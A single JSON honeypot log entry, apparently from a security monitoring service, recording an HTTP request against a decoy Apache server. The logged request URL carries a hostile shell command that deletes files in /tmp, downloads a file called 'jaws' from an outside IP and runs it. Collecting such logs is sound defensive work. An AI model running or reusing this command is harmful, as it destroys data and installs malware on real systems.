{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"honeypot","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"Tue Mar  7 01:41:01 UTC 2023","parsedMessage":{"timestamp":"2023-03-07 01:40:53+00:00","message_type":"http-access","correlation_id":null,"level":"WARNING","message":"103.162.29.165 - - \"GET /shell?cd+/tmp;rm+-rf+*;wget+45.77.243.49/jaws;sh+/tmp/jaws HTTP/1.1\" 404 488 \"-\" \"Hello, world\"","ip":"103.162.29.165"},"id":"35bdab58-d1e6-40f2-a272-9ef984602fbb","EventProcessedUtcTime":"2023-03-07T01:41:01.9080272Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-03-07T01:41:01.6880000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/103.162.29.165"}